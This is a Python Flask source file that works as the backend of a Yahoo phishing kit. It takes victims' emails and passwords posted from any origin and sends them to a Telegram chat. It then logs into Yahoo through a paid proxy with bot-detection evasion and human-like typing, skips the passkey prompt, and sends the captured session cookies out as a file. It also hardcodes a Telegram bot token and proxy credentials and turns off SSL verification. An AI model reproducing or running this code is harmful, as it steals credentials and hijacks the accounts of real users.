from flask import Flask, request, jsonify
from flask_cors import CORS
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import json
import random
import telebot
from threading import Thread
from selenium.webdriver.common.action_chains import ActionChains
import os
import ssl

# ================== ENVIRONMENT VARIABLES (For Hosting) ==================
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')

if not BOT_TOKEN or not CHAT_ID:
    print("❌ ERROR: BOT_TOKEN or CHAT_ID not set in Environment Variables!")
    exit(1)
# ================== SSL BYPASS ==================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

app = Flask(__name__)
CORS(app)

# ================== CONFIG ==================
BOT_TOKEN = "8664946712:AAHho-AsU7hRuBs43J-7k-kZ5gmhUz6-6b8"
CHAT_ID = -1003709189605

# === NEW PROXY ===
PROXY_HOST = "us.decodo.com"
PROXY_PORT = "10000"
PROXY_USER = "sph7g5g4xx"
PROXY_PASS = "zEfr90tw8nZh5uHWr_"
# ===========================================
bot = telebot.TeleBot(BOT_TOKEN)

def create_proxy_extension():
    """Create proxy extension on the fly"""
    ext_dir = "temp_proxy_auth"
    os.makedirs(ext_dir, exist_ok=True)

    manifest = {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": ["proxy", "tabs", "<all_urls>", "webRequest", "webRequestBlocking"],
        "background": {"scripts": ["background.js"]},
    }

    background = f'''var config = {{
    mode: "fixed_servers",
    rules: {{
      singleProxy: {{
        scheme: "http",
        host: "{PROXY_HOST}",
        port: parseInt("{PROXY_PORT}")
      }},
      bypassList: ["localhost"]
    }}
  }};

chrome.proxy.settings.set({{value: config, scope: "regular"}}, function() {{}});

function callbackFn(details) {{
    return {{
        authCredentials: {{
            username: "{PROXY_USER}",
            password: "{PROXY_PASS}"
        }}
    }};
}}

chrome.webRequest.onAuthRequired.addListener(
    callbackFn,
    {{urls: ["<all_urls>"]}},
    ['blocking']
);
'''

    with open(f"{ext_dir}/manifest.json", "w") as f:
        json.dump(manifest, f, indent=2)
    with open(f"{ext_dir}/background.js", "w") as f:
        f.write(background)

    return os.path.abspath(ext_dir)

def human_type(element, text):
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.08, 0.25))

def random_mouse_move(driver):
    try:
        actions = ActionChains(driver)
        for _ in range(random.randint(4, 8)):
            actions.move_by_offset(random.randint(-80, 80), random.randint(-60, 60)).perform()
            time.sleep(random.uniform(0.4, 0.9))
    except:
        pass

@app.route('/start_login', methods=['POST'])
def start_login():
    data = request.json
    email = data.get('email')
    password = data.get('password')

    if not email or not password:
        return jsonify({"error": "Missing credentials"}), 400

    bot.send_message(CHAT_ID, f"📧 New Login Request:\nEmail: {email}\nPassword: {password}")

    Thread(target=selenium_login, args=(email, password)).start()
    return jsonify({"success": True, "message": "Login started"})

def selenium_login(email, password):
    driver = None
    try:
        bot.send_message(CHAT_ID, f"🔄 Starting login for {email}")

        options = uc.ChromeOptions()
        options.headless = False
        options.add_argument("--start-maximized")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--no-sandbox")           # ← Add this
        options.add_argument("--disable-dev-shm-usage") # ← Add this
        options.add_argument("--disable-gpu")           # ← Add this
        
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--ignore-ssl-errors")
        options.add_argument("--allow-insecure-localhost")
        options.add_argument("--disable-web-security")

        # Use your existing proxy_auth extension
        extension_path = os.path.abspath("proxy_auth")
        options.add_argument(f"--load-extension={extension_path}")

        driver = uc.Chrome(options=options)

        # ... rest of your code remains the same ...

        driver = uc.Chrome(options=options)

        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

        driver.get("https://login.yahoo.com/")
        time.sleep(random.uniform(10, 15))

        wait = WebDriverWait(driver, 45)

        # Username
        username_field = wait.until(EC.element_to_be_clickable((By.NAME, "username")))
        random_mouse_move(driver)
        human_type(username_field, email)
        time.sleep(random.uniform(2, 4))
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        time.sleep(random.uniform(8, 13))

        # Password
        password_field = wait.until(EC.element_to_be_clickable((By.NAME, "password")))
        random_mouse_move(driver)
        human_type(password_field, password)
        time.sleep(random.uniform(2, 4))
        driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]').click()

        bot.send_message(CHAT_ID, "⏳ Waiting after password (looking for Passkey prompt)...")
        time.sleep(10)

        # Skip Passkey
        try:
            skip_button = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(),'Skip')]"))
            )
            random_mouse_move(driver)
            skip_button.click()
            bot.send_message(CHAT_ID, "✅ Clicked 'Skip' on Passkey prompt")
            time.sleep(8)
        except:
            bot.send_message(CHAT_ID, "No Passkey prompt found or already skipped")

        # Go to Mail
        driver.get("https://mail.yahoo.com/")
        time.sleep(15)

        # Save cookies
        cookies = driver.get_cookies()
        cookie_dict = {c['name']: c['value'] for c in cookies}

        filename = f"yahoo_cookies_{email.split('@')[0]}.json"
        with open(filename, "w") as f:
            json.dump({
                "email": email,
                "total_cookies": len(cookies),
                "full_cookies": cookie_dict
            }, f, indent=2)

        with open(filename, "rb") as f:
            bot.send_document(CHAT_ID, f, caption=f"✅ Login Finished!\nEmail: {email}\nTotal Cookies: {len(cookies)}")

    except Exception as e:
        bot.send_message(CHAT_ID, f"❌ Error: {str(e)[:250]}")
    finally:
        if driver:
            driver.quit()

if __name__ == '__main__':
    print("🚀 Yahoo Login Bot Started (Proxy Embedded)")
    app.run(host='0.0.0.0', port=5001, debug=False)
